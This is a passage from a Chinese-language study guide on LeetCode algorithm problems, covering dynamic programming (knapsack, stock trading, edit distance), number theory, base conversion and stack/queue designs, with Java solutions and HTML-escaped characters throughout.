pairs[i][0]) &#123; dp[i] = Math.max(dp[i], dp[j] + 1); &#125; &#125; &#125; return Arrays.stream(dp).max().orElse(0);&#125; 最长摆动子序列 376. Wiggle Subsequence (Medium) 12345678910Input: [1,7,4,9,2,5]Output: 6The entire sequence is a wiggle sequence.Input: [1,17,5,10,13,15,10,5,16,8]Output: 7There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8].Input: [1,2,3,4,5,6,7,8,9]Output: 2 要求：使用 O(N) 时间复杂度求解。 1234567891011121314public int wiggleMaxLength(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int up = 1, down = 1; for (int i = 1; i &lt; nums.length; i++) &#123; if (nums[i] &gt; nums[i - 1]) &#123; up = down + 1; &#125; else if (nums[i] &lt; nums[i - 1]) &#123; down = up + 1; &#125; &#125; return Math.max(up, down);&#125; 最长公共子序列对于两个子序列 S1 和 S2，找出它们最长的公共子序列。 定义一个二维数组 dp 用来存储最长公共子序列的长度，其中 dp[i][j] 表示 S1 的前 i 个字符与 S2 的前 j 个字符最长公共子序列的长度。考虑 S1i 与 S2j 值是否相等，分为两种情况： 当 S1i==S2j 时，那么就能在 S1 的前 i-1 个字符与 S2 的前 j-1 个字符最长公共子序列的基础上再加上 S1i 这个值，最长公共子序列长度加 1 ，即 dp[i][j] = dp[i-1][j-1] + 1。 当 S1i != S2j 时，此时最长公共子序列为 S1 的前 i-1 个字符和 S2 的前 j 个字符最长公共子序列，与 S1 的前 i 个字符和 S2 的前 j-1 个字符最长公共子序列，它们的最大者，即 dp[i][j] = max{ dp[i-1][j], dp[i][j-1] }。 综上，最长公共子序列的状态转移方程为： 对于长度为 N 的序列 S1 和 长度为 M 的序列 S2，dp[N][M] 就是序列 S1 和序列 S2 的最长公共子序列长度。 与最长递增子序列相比，最长公共子序列有以下不同点： 针对的是两个序列，求它们的最长公共子序列。 在最长递增子序列中，dp[i] 表示以 Si 为结尾的最长递增子序列长度，子序列必须包含 Si ；在最长公共子序列中，dp[i][j] 表示 S1 中前 i 个字符与 S2 中前 j 个字符的最长公共子序列长度，不一定包含 S1i 和 S2j 。 在求最终解时，最长公共子序列中 dp[N][M] 就是最终解，而最长递增子序列中 dp[N] 不是最终解，因为以 SN 为结尾的最长递增子序列不一定是整个序列最长递增子序列，需要遍历一遍 dp 数组找到最大者。 1234567891011121314public int lengthOfLCS(int[] nums1, int[] nums2) &#123; int n1 = nums1.length, n2 = nums2.length; int[][] dp = new int[n1 + 1][n2 + 1]; for (int i = 1; i &lt;= n1; i++) &#123; for (int j = 1; j &lt;= n2; j++) &#123; if (nums1[i - 1] == nums2[j - 1]) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; &#125; return dp[n1][n2];&#125; 0-1 背包有一个容量为 N 的背包，要用这个背包装下物品的价值最大，这些物品有两个属性：体积 w 和价值 v。 定义一个二维数组 dp 存储最大价值，其中 dp[i][j] 表示前 i 件物品体积不超过 j 的情况下能达到的最大价值。设第 i 件物品体积为 w，价值为 v，根据第 i 件物品是否添加到背包中，可以分两种情况讨论： 第 i 件物品没添加到背包，总体积不超过 j 的前 i 件物品的最大价值就是总体积不超过 j 的前 i-1 件物品的最大价值，dp[i][j] = dp[i-1][j]。 第 i 件物品添加到背包中，dp[i][j] = dp[i-1][j-w] + v。 第 i 件物品可添加也可以不添加，取决于哪种情况下最大价值更大。 综上，0-1 背包的状态转移方程为： 1234567891011121314public int knapsack(int W, int N, int[] weights, int[] values) &#123; int[][] dp = new int[N + 1][W + 1]; for (int i = 1; i &lt;= N; i++) &#123; int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j &lt;= W; j++) &#123; if (j &gt;= w) &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - w] + v); &#125; else &#123; dp[i][j] = dp[i - 1][j]; &#125; &#125; &#125; return dp[N][W];&#125; 空间优化 在程序实现时可以对 0-1 背包做优化。观察状态转移方程可以知道，前 i 件物品的状态仅由前 i-1 件物品的状态有关，因此可以将 dp 定义为一维数组，其中 dp[j] 既可以表示 dp[i-1][j] 也可以表示 dp[i][j]。此时， 因为 dp[j-w] 表示 dp[i-1][j-w]，因此不能先求 dp[i][j-w]，以防止将 dp[i-1][j-w] 覆盖。也就是说要先计算 dp[i][j] 再计算 dp[i][j-w]，在程序实现时需要按倒序来循环求解。 123456789101112public int knapsack(int W, int N, int[] weights, int[] values) &#123; int[] dp = new int[W + 1]; for (int i = 1; i &lt;= N; i++) &#123; int w = weights[i - 1], v = values[i - 1]; for (int j = W; j &gt;= 1; j--) &#123; if (j &gt;= w) &#123; dp[j] = Math.max(dp[j], dp[j - w] + v); &#125; &#125; &#125; return dp[W];&#125; 无法使用贪心算法的解释 0-1 背包问题无法使用贪心算法来求解，也就是说不能按照先添加性价比最高的物品来达到最优，这是因为这种方式可能造成背包空间的浪费，从而无法达到最优。考虑下面的物品和一个容量为 5 的背包，如果先添加物品 0 再添加物品 1，那么只能存放的价值为 16，浪费了大小为 2 的空间。最优的方式是存放物品 1 和物品 2，价值为 22. id w v v/w 0 1 6 6 1 2 10 5 2 3 12 4 变种 完全背包：物品数量为无限个 多重背包：物品数量有限制 多维费用背包：物品不仅有重量，还有体积，同时考虑这两种限制 其它：物品之间相互约束或者依赖 划分数组为和相等的两部分 416. Partition Equal Subset Sum (Medium) 12345Input: [1, 5, 11, 5]Output: trueExplanation: The array can be partitioned as [1, 5, 5] and [11]. 可以看成一个背包大小为 sum/2 的 0-1 背包问题。 123456789101112131415161718192021222324public boolean canPartition(int[] nums) &#123; int sum = computeArraySum(nums); if (sum % 2 != 0) &#123; return false; &#125; int W = sum / 2; boolean[] dp = new boolean[W + 1]; dp[0] = true; Arrays.sort(nums); for (int num : nums) &#123; // 0-1 背包一个物品只能用一次 for (int i = W; i &gt;= num; i--) &#123; // 从后往前，先计算 dp[i] 再计算 dp[i-num] dp[i] = dp[i] || dp[i - num]; &#125; &#125; return dp[W];&#125;private int computeArraySum(int[] nums) &#123; int sum = 0; for (int num : nums) &#123; sum += num; &#125; return sum;&#125; 改变一组数的正负号使得它们的和为一给定数 494. Target Sum (Medium) 1234567891011Input: nums is [1, 1, 1, 1, 1], S is 3.Output: 5Explanation:-1+1+1+1+1 = 3+1-1+1+1+1 = 3+1+1-1+1+1 = 3+1+1+1-1+1 = 3+1+1+1+1-1 = 3There are 5 ways to assign symbols to make the sum of nums be target 3. 该问题可以转换为 Subset Sum 问题，从而使用 0-1 背包的方法来求解。 可以将这组数看成两部分，P 和 N，其中 P 使用正号，N 使用负号，有以下推导： 123 sum(P) - sum(N) = targetsum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N) 2 * sum(P) = target + sum(nums) 因此只要找到一个子集，令它们都取正号，并且和等于 (target + sum(nums))/2，就证明存在解。 123456789101112131415161718192021222324public int findTargetSumWays(int[] nums, int S) &#123; int sum = computeArraySum(nums); if (sum &lt; S || (sum + S) % 2 == 1) &#123; return 0; &#125; int W = (sum + S) / 2; int[] dp = new int[W + 1]; dp[0] = 1; Arrays.sort(nums); for (int num : nums) &#123; for (int i = W; i &gt;= num; i--) &#123; dp[i] = dp[i] + dp[i - num]; &#125; &#125; return dp[W];&#125;private int computeArraySum(int[] nums) &#123; int sum = 0; for (int num : nums) &#123; sum += num; &#125; return sum;&#125; DFS 解法： 1234567891011public int findTargetSumWays(int[] nums, int S) &#123; return findTargetSumWays(nums, 0, S);&#125;private int findTargetSumWays(int[] nums, int start, int S) &#123; if (start == nums.length) &#123; return S == 0 ? 1 : 0; &#125; return findTargetSumWays(nums, start + 1, S + nums[start]) + findTargetSumWays(nums, start + 1, S - nums[start]);&#125; 字符串按单词列表分割 139. Word Break (Medium) 123s = "leetcode",dict = ["leet", "code"].Return true because "leetcode" can be segmented as "leet code". dict 中的单词没有使用次数的限制，因此这是一个完全背包问题。 0-1 背包和完全背包在实现上的不同之处是，0-1 背包对物品的迭代是在最外层，而完全背包对物品的迭代是在最里层。 1234567891011121314public boolean wordBreak(String s, List&lt;String&gt; wordDict) &#123; int n = s.length(); boolean[] dp = new boolean[n + 1]; dp[0] = true; for (int i = 1; i &lt;= n; i++) &#123; for (String word : wordDict) &#123; // 完全一个物品可以使用多次 int len = word.length(); if (len &lt;= i &amp;&amp; word.equals(s.substring(i - len, i))) &#123; dp[i] = dp[i] || dp[i - len]; &#125; &#125; &#125; return dp[n];&#125; 01 字符构成最多的字符串 474. Ones and Zeroes (Medium) 1234Input: Array = &#123;"10", "0001", "111001", "1", "0"&#125;, m = 5, n = 3Output: 4Explanation: There are totally 4 strings can be formed by the using of 5 0s and 3 1s, which are "10","0001","1","0" 这是一个多维费用的 0-1 背包问题，有两个背包大小，0 的数量和 1 的数量。 12345678910111213141516171819202122public int findMaxForm(String[] strs, int m, int n) &#123; if (strs == null || strs.length == 0) &#123; return 0; &#125; int[][] dp = new int[m + 1][n + 1]; for (String s : strs) &#123; // 每个字符串只能用一次 int ones = 0, zeros = 0; for (char c : s.toCharArray()) &#123; if (c == '0') &#123; zeros++; &#125; else &#123; ones++; &#125; &#125; for (int i = m; i &gt;= zeros; i--) &#123; for (int j = n; j &gt;= ones; j--) &#123; dp[i][j] = Math.max(dp[i][j], dp[i - zeros][j - ones] + 1); &#125; &#125; &#125; return dp[m][n];&#125; 找零钱的方法数 322. Coin Change (Medium) 1234567Example 1:coins = [1, 2, 5], amount = 11return 3 (11 = 5 + 5 + 1)Example 2:coins = [2], amount = 3return -1. 题目描述：给一些面额的硬币，要求用这些硬币来组成给定面额的钱数，并且使得硬币数量最少。硬币可以重复使用。 物品：硬币 物品大小：面额 物品价值：数量 因为硬币可以重复使用，因此这是一个完全背包问题。 123456789101112131415public int coinChange(int[] coins, int amount) &#123; if (coins == null || coins.length == 0) &#123; return 0; &#125; int[] minimum = new int[amount + 1]; Arrays.fill(minimum, amount + 1); minimum[0] = 0; Arrays.sort(coins); for (int i = 1; i &lt;= amount; i++) &#123; for (int j = 0; j &lt; coins.length &amp;&amp; coins[j] &lt;= i; j++) &#123; minimum[i] = Math.min(minimum[i], minimum[i - coins[j]] + 1); &#125; &#125; return minimum[amount] &gt; amount ? -1 : minimum[amount];&#125; 组合总和 377. Combination Sum IV (Medium) 123456789101112131415nums = [1, 2, 3]target = 4The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Therefore the output is 7. 完全背包。 1234567891011121314public int combinationSum4(int[] nums, int target) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int[] maximum = new int[target + 1]; maximum[0] = 1; Arrays.sort(nums); for (int i = 1; i &lt;= target; i++) &#123; for (int j = 0; j &lt; nums.length &amp;&amp; nums[j] &lt;= i; j++) &#123; maximum[i] += maximum[i - nums[j]]; &#125; &#125; return maximum[target];&#125; 只能进行 k 次的股票交易 188. Best Time to Buy and Sell Stock IV (Hard) 123456789101112131415161718192021public int maxProfit(int k, int[] prices) &#123; int n = prices.length; if (k &gt;= n / 2) &#123; // 这种情况下该问题退化为普通的股票交易问题 int maxProfit = 0; for (int i = 1; i &lt; n; i++) &#123; if (prices[i] &gt; prices[i - 1]) &#123; maxProfit += prices[i] - prices[i - 1]; &#125; &#125; return maxProfit; &#125; int[][] maxProfit = new int[k + 1][n]; for (int i = 1; i &lt;= k; i++) &#123; int localMax = maxProfit[i - 1][0] - prices[0]; for (int j = 1; j &lt; n; j++) &#123; maxProfit[i][j] = Math.max(maxProfit[i][j - 1], prices[j] + localMax); localMax = Math.max(localMax, maxProfit[i - 1][j] - prices[j]); &#125; &#125; return maxProfit[k][n - 1];&#125; 只能进行两次的股票交易 123. Best Time to Buy and Sell Stock III (Hard) 12345678910111213141516171819public int maxProfit(int[] prices) &#123; int firstBuy = Integer.MIN_VALUE, firstSell = 0; int secondBuy = Integer.MIN_VALUE, secondSell = 0; for (int curPrice : prices) &#123; if (firstBuy &lt; -curPrice) &#123; firstBuy = -curPrice; &#125; if (firstSell &lt; firstBuy + curPrice) &#123; firstSell = firstBuy + curPrice; &#125; if (secondBuy &lt; firstSell - curPrice) &#123; secondBuy = firstSell - curPrice; &#125; if (secondSell &lt; secondBuy + curPrice) &#123; secondSell = secondBuy + curPrice; &#125; &#125; return secondSell;&#125; 股票交易需要冷却期的股票交易 309. Best Time to Buy and Sell Stock with Cooldown(Medium) 题目描述：交易之后需要有一天的冷却时间。 12345678910111213141516171819public int maxProfit(int[] prices) &#123; if (prices == null || prices.length == 0) &#123; return 0; &#125; int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i &lt; N; i++) &#123; buy[i] = s2[i - 1] - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); &#125; return Math.max(sell[N - 1], s2[N - 1]);&#125; 需要交易费用的股票交易 714. Best Time to Buy and Sell Stock with Transaction Fee (Medium) 12345678Input: prices = [1, 3, 2, 8, 4, 9], fee = 2Output: 8Explanation: The maximum profit can be achieved by:Buying at prices[0] = 1Selling at prices[3] = 8Buying at prices[4] = 4Selling at prices[5] = 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8. 题目描述：每交易一次，都要支付一定的费用。 12345678910111213141516public int maxProfit(int[] prices, int fee) &#123; int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i &lt; N; i++) &#123; buy[i] = Math.max(sell[i - 1], s2[i - 1]) - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) - fee + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); &#125; return Math.max(sell[N - 1], s2[N - 1]);&#125; 买入和售出股票最大的收益 121. Best Time to Buy and Sell Stock (Easy) 题目描述：只进行一次交易。 只要记录前面的最小价格，将这个最小价格作为买入价格，然后将当前的价格作为售出价格，查看当前收益是不是最大收益。 1234567891011public int maxProfit(int[] prices) &#123; int n = prices.length; if (n == 0) return 0; int soFarMin = prices[0]; int max = 0; for (int i = 1; i &lt; n; i++) &#123; if (soFarMin &gt; prices[i]) soFarMin = prices[i]; else max = Math.max(max, prices[i] - soFarMin); &#125; return max;&#125; 字符串编辑删除两个字符串的字符使它们相等 583. Delete Operation for Two Strings (Medium) 123Input: "sea", "eat"Output: 2Explanation: You need one step to make "sea" to "ea" and another step to make "eat" to "ea". 可以转换为求两个字符串的最长公共子序列问题。 1234567891011121314151617public int minDistance(String word1, String word2) &#123; int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 0; i &lt;= m; i++) &#123; for (int j = 0; j &lt;= n; j++) &#123; if (i == 0 || j == 0) &#123; continue; &#125; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i][j - 1], dp[i - 1][j]); &#125; &#125; &#125; return m + n - 2 * dp[m][n];&#125; 编辑距离 72. Edit Distance (Hard) 123456789101112131415161718Example 1:Input: word1 = "horse", word2 = "ros"Output: 3Explanation:horse -&gt; rorse (replace 'h' with 'r')rorse -&gt; rose (remove 'r')rose -&gt; ros (remove 'e')Example 2:Input: word1 = "intention", word2 = "execution"Output: 5Explanation:intention -&gt; inention (remove 't')inention -&gt; enention (replace 'i' with 'e')enention -&gt; exention (replace 'n' with 'x')exention -&gt; exection (replace 'n' with 'c')exection -&gt; execution (insert 'u') 题目描述：修改一个字符串成为另一个字符串，使得修改次数最少。一次修改操作包括：插入一个字符、删除一个字符、替换一个字符。 1234567891011121314151617181920212223public int minDistance(String word1, String word2) &#123; if (word1 == null || word2 == null) &#123; return 0; &#125; int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i &lt;= m; i++) &#123; dp[i][0] = i; &#125; for (int i = 1; i &lt;= n; i++) &#123; dp[0][i] = i; &#125; for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1]; &#125; else &#123; dp[i][j] = Math.min(dp[i - 1][j - 1], Math.min(dp[i][j - 1], dp[i - 1][j])) + 1; &#125; &#125; &#125; return dp[m][n];&#125; 复制粘贴字符 650. 2 Keys Keyboard (Medium) 题目描述：最开始只有一个字符 A，问需要多少次操作能够得到 n 个字符 A，每次操作可以复制当前所有的字符，或者粘贴。 1234567Input: 3Output: 3Explanation:Intitally, we have one character &apos;A&apos;.In step 1, we use Copy All operation.In step 2, we use Paste operation to get &apos;AA&apos;.In step 3, we use Paste operation to get &apos;AAA&apos;. 1234567public int minSteps(int n) &#123; if (n == 1) return 0; for (int i = 2; i &lt;= Math.sqrt(n); i++) &#123; if (n % i == 0) return i + minSteps(n / i); &#125; return n;&#125; 1234567891011121314public int minSteps(int n) &#123; int[] dp = new int[n + 1]; int h = (int) Math.sqrt(n); for (int i = 2; i &lt;= n; i++) &#123; dp[i] = i; for (int j = 2; j &lt;= h; j++) &#123; if (i % j == 0) &#123; dp[i] = dp[j] + dp[i / j]; break; &#125; &#125; &#125; return dp[n];&#125; 数学素数素数分解 每一个数都可以分解成素数的乘积，例如 84 = 22 * 31 * 50 * 71 * 110 * 130 * 170 * … 整除 令 x = 2m0 * 3m1 * 5m2 * 7m3 * 11m4 * … 令 y = 2n0 * 3n1 * 5n2 * 7n3 * 11n4 * … 如果 x 整除 y（y mod x == 0），则对于所有 i，mi &lt;= ni。 最大公约数最小公倍数 x 和 y 的最大公约数为：gcd(x,y) = 2min(m0,n0) * 3min(m1,n1) * 5min(m2,n2) * … x 和 y 的最小公倍数为：lcm(x,y) = 2max(m0,n0) * 3max(m1,n1) * 5max(m2,n2) * … 生成素数序列 204. Count Primes (Easy) 埃拉托斯特尼筛法在每次找到一个素数时，将能被素数整除的数排除掉。 123456789101112131415public int countPrimes(int n) &#123; boolean[] notPrimes = new boolean[n + 1]; int count = 0; for (int i = 2; i &lt; n; i++) &#123; if (notPrimes[i]) &#123; continue; &#125; count++; // 从 i * i 开始，因为如果 k &lt; i，那么 k * i 在之前就已经被去除过了 for (long j = (long) (i) * i; j &lt; n; j += i) &#123; notPrimes[(int) j] = true; &#125; &#125; return count;&#125; 最大公约数123int gcd(int a, int b) &#123; return b == 0 ? a : gcd(b, a% b);&#125; 最小公倍数为两数的乘积除以最大公约数。 123int lcm(int a, int b) &#123; return a * b / gcd(a, b);&#125; 使用位操作和减法求解最大公约数 编程之美：2.7 对于 a 和 b 的最大公约数 f(a, b)，有： 如果 a 和 b 均为偶数，f(a, b) = 2*f(a/2, b/2); 如果 a 是偶数 b 是奇数，f(a, b) = f(a/2, b); 如果 b 是偶数 a 是奇数，f(a, b) = f(a, b/2); 如果 a 和 b 均为奇数，f(a, b) = f(b, a-b); 乘 2 和除 2 都可以转换为移位操作。 123456789101112131415161718public int gcd(int a, int b) &#123; if (a &lt; b) &#123; return gcd(b, a); &#125; if (b == 0) &#123; return a; &#125; boolean isAEven = isEven(a), isBEven = isEven(b); if (isAEven &amp;&amp; isBEven) &#123; return 2 * gcd(a &gt;&gt; 1, b &gt;&gt; 1); &#125; else if (isAEven &amp;&amp; !isBEven) &#123; return gcd(a &gt;&gt; 1, b); &#125; else if (!isAEven &amp;&amp; isBEven) &#123; return gcd(a, b &gt;&gt; 1); &#125; else &#123; return gcd(b, a - b); &#125;&#125; 进制转换7 进制 504. Base 7 (Easy) 12345678910111213141516public String convertToBase7(int num) &#123; if (num == 0) &#123; return "0"; &#125; StringBuilder sb = new StringBuilder(); boolean isNegative = num &lt; 0; if (isNegative) &#123; num = -num; &#125; while (num &gt; 0) &#123; sb.append(num % 7); num /= 7; &#125; String ret = sb.reverse().toString(); return isNegative ? "-" + ret : ret;&#125; Java 中 static String toString(int num, int radix) 可以将一个整数转换为 redix 进制表示的字符串。 123public String convertToBase7(int num) &#123; return Integer.toString(num, 7);&#125; 16 进制 405. Convert a Number to Hexadecimal (Easy) 1234567891011Input:26Output:"1a"Input:-1Output:"ffffffff" 负数要用它的补码形式。 12345678910public String toHex(int num) &#123; char[] map = &#123;'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'&#125;; if (num == 0) return "0"; StringBuilder sb = new StringBuilder(); while (num != 0) &#123; sb.append(map[num &amp; 0b1111]); num &gt;&gt;&gt;= 4; // 因为考虑的是补码形式，因此符号位就不能有特殊的意义，需要使用无符号右移，左边填 0 &#125; return sb.reverse().toString();&#125; 26 进制 168. Excel Sheet Column Title (Easy) 12345671 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB 因为是从 1 开始计算的，而不是从 0 开始，因此需要对 n 执行 -1 操作。 1234567public String convertToTitle(int n) &#123; if (n == 0) &#123; return ""; &#125; n--; return convertToTitle(n / 26) + (char) (n % 26 + 'A');&#125; 阶乘统计阶乘尾部有多少个 0 172. Factorial Trailing Zeroes (Easy) 尾部的 0 由 2 * 5 得来，2 的数量明显多于 5 的数量，因此只要统计有多少个 5 即可。 对于一个数 N，它所包含 5 的个数为：N/5 + N/52 + N/53 + …，其中 N/5 表示不大于 N 的数中 5 的倍数贡献一个 5，N/52 表示不大于 N 的数中 52 的倍数再贡献一个 5 …。 123public int trailingZeroes(int n) &#123; return n == 0 ? 0 : n / 5 + trailingZeroes(n / 5);&#125; 如果统计的是 N! 的二进制表示中最低位 1 的位置，只要统计有多少个 2 即可，该题目出自 编程之美：2.2 。和求解有多少个 5 一样，2 的个数为 N/2 + N/22 + N/23 + … 字符串加法减法二进制加法 67. Add Binary (Easy) 123a = "11"b = "1"Return "100". 123456789101112131415public String addBinary(String a, String b) &#123; int i = a.length() - 1, j = b.length() - 1, carry = 0; StringBuilder str = new StringBuilder(); while (carry == 1 || i &gt;= 0 || j &gt;= 0) &#123; if (i &gt;= 0 &amp;&amp; a.charAt(i--) == '1') &#123; carry++; &#125; if (j &gt;= 0 &amp;&amp; b.charAt(j--) == '1') &#123; carry++; &#125; str.append(carry % 2); carry /= 2; &#125; return str.reverse().toString();&#125; 字符串加法 415. Add Strings (Easy) 字符串的值为非负整数。 1234567891011public String addStrings(String num1, String num2) &#123; StringBuilder str = new StringBuilder(); int carry = 0, i = num1.length() - 1, j = num2.length() - 1; while (carry == 1 || i &gt;= 0 || j &gt;= 0) &#123; int x = i &lt; 0 ? 0 : num1.charAt(i--) - '0'; int y = j &lt; 0 ? 0 : num2.charAt(j--) - '0'; str.append((x + y + carry) % 10); carry = (x + y + carry) / 10; &#125; return str.reverse().toString();&#125; 相遇问题改变数组元素使所有的数组元素都相等 462. Minimum Moves to Equal Array Elements II (Medium) 12345678910Input:[1,2,3]Output:2Explanation:Only two moves are needed (remember each move increments or decrements one element):[1,2,3] =&gt; [2,2,3] =&gt; [2,2,2] 每次可以对一个数组元素加一或者减一，求最小的改变次数。 这是个典型的相遇问题，移动距离最小的方式是所有元素都移动到中位数。理由如下： 设 m 为中位数。a 和 b 是 m 两边的两个元素，且 b &gt; a。要使 a 和 b 相等，它们总共移动的次数为 b - a，这个值等于 (b - m) + (m - a)，也就是把这两个数移动到中位数的移动次数。 设数组长度为 N，则可以找到 N/2 对 a 和 b 的组合，使它们都移动到 m 的位置。 解法 1 先排序，时间复杂度：O(NlogN) 1234567891011public int minMoves2(int[] nums) &#123; Arrays.sort(nums); int move = 0; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; move += nums[h] - nums[l]; l++; h--; &#125; return move;&#125; 解法 2 使用快速选择找到中位数，时间复杂度 O(N) 1234567891011121314151617181920212223242526272829303132333435363738394041424344public int minMoves2(int[] nums) &#123; int move = 0; int median = findKthSmallest(nums, nums.length / 2); for (int num : nums) &#123; move += Math.abs(num - median); &#125; return move;&#125;private int findKthSmallest(int[] nums, int k) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) &#123; break; &#125; if (j &lt; k) &#123; l = j + 1; &#125; else &#123; h = j - 1; &#125; &#125; return nums[k];&#125;private int partition(int[] nums, int l, int h) &#123; int i = l, j = h + 1; while (true) &#123; while (nums[++i] &lt; nums[l] &amp;&amp; i &lt; h) ; while (nums[--j] &gt; nums[l] &amp;&amp; j &gt; l) ; if (i &gt;= j) &#123; break; &#125; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125;private void swap(int[] nums, int i, int j) &#123; int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;&#125; 多数投票问题数组中出现次数多于 n / 2 的元素 169. Majority Element (Easy) 先对数组排序，最中间那个数出现次数一定多于 n / 2。 1234public int majorityElement(int[] nums) &#123; Arrays.sort(nums); return nums[nums.length / 2];&#125; 可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。可以这么理解该算法：使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素不相等时，令 cnt–。如果前面查找了 i 个元素，且 cnt == 0，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2，因为如果多于 i / 2 的话 cnt 就一定不会为 0。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。 12345678public int majorityElement(int[] nums) &#123; int cnt = 0, majority = nums[0]; for (int num : nums) &#123; majority = (cnt == 0) ? num : majority; cnt = (majority == num) ? cnt + 1 : cnt - 1; &#125; return majority;&#125; 其它平方数 367. Valid Perfect Square (Easy) 12Input: 16Returns: True 平方序列：1,4,9,16,.. 间隔：3,5,7,… 间隔为等差数列，使用这个特性可以得到从 1 开始的平方序列。 12345678public boolean isPerfectSquare(int num) &#123; int subNum = 1; while (num &gt; 0) &#123; num -= subNum; subNum += 2; &#125; return num == 0;&#125; 3 的 n 次方 326. Power of Three (Easy) 123public boolean isPowerOfThree(int n) &#123; return n &gt; 0 &amp;&amp; (1162261467 % n == 0);&#125; 乘积数组 238. Product of Array Except Self (Medium) 1For example, given [1,2,3,4], return [24,12,8,6]. 给定一个数组，创建一个新数组，新数组的每个元素为原始数组中除了该位置上的元素之外所有元素的乘积。 要求时间复杂度为 O(N)，并且不能使用除法。 12345678910111213141516public int[] productExceptSelf(int[] nums) &#123; int n = nums.length; int[] products = new int[n]; Arrays.fill(products, 1); int left = 1; for (int i = 1; i &lt; n; i++) &#123; left *= nums[i - 1]; products[i] *= left; &#125; int right = 1; for (int i = n - 2; i &gt;= 0; i--) &#123; right *= nums[i + 1]; products[i] *= right; &#125; return products;&#125; 找出数组中的乘积最大的三个数 628. Maximum Product of Three Numbers (Easy) 12Input: [1,2,3,4]Output: 24 1234567891011121314151617181920212223public int maximumProduct(int[] nums) &#123; int max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE, min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE; for (int n : nums) &#123; if (n &gt; max1) &#123; max3 = max2; max2 = max1; max1 = n; &#125; else if (n &gt; max2) &#123; max3 = max2; max2 = n; &#125; else if (n &gt; max3) &#123; max3 = n; &#125; if (n &lt; min1) &#123; min2 = min1; min1 = n; &#125; else if (n &lt; min2) &#123; min2 = n; &#125; &#125; return Math.max(max1*max2*max3, max1*min1*min2);&#125; 数据结构相关栈和队列用栈实现队列 232. Implement Queue using Stacks (Easy) 12345678910111213141516171819202122232425262728293031class MyQueue &#123; private Stack&lt;Integer&gt; in = new Stack&lt;&gt;(); private Stack&lt;Integer&gt; out = new Stack&lt;&gt;(); public void push(int x) &#123; in.push(x); &#125; public int pop() &#123; in2out(); return out.pop(); &#125; public int peek() &#123; in2out(); return out.peek(); &#125; private void in2out() &#123; if (out.isEmpty()) &#123; while (!in.isEmpty()) &#123; out.push(in.pop()); &#125; &#125; &#125; public boolean empty() &#123; return in.isEmpty() &amp;&amp; out.isEmpty(); &#125;&#125; 用队列实现栈 225. Implement Stack using Queues (Easy) 在将一个元素 x 插入队列时，需要让除了 x 之外的所有元素出队列，再入队列。此时 x 在队首，第一个出队列，实现了后进先出顺序。 12345678910111213141516171819202122232425262728class MyStack &#123; private Queue&lt;Integer&gt; queue; public MyStack() &#123; queue = new LinkedList&lt;&gt;(); &#125; public void push(int x) &#123; queue.add(x); int cnt = queue.size(); while (cnt-- &gt; 1) &#123; queue.add(queue.poll()); &#125; &#125; public int pop() &#123; return queue.remove(); &#125; public int top() &#123; return queue.peek(); &#125; public boolean empty() &#123; return queue.isEmpty(); &#125;&#125; 最小值栈 155. Min Stack (Easy) 1234567891011121314151617181920212223242526272829303132class MinStack &#123; private Stack&lt;Integer&gt; dataStack; private Stack&lt;Integer&gt; minStack; private int min; public MinStack() &#123; dataStack = new Stack&lt;&gt;(); minStack = new Stack&lt;&gt;(); min = Integer.MAX_VALUE; &#125; public void push(int x) &#123; dataStack.add(x); min = Math.min(min, x); minStack.add(min); &#125; public void pop() &#123; dataStack.pop(); minStack.pop(); min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek(); &#125; public int top() &#123; return dataStack.peek(); &#125; public int getMin() &#123; return minStack.peek(); &#125;&#125; 对于实现最小值队列问题，可以先将队列使用栈来实现，然后就将问题转换为最小值栈，这个问题出现在 编程之美：3.7。 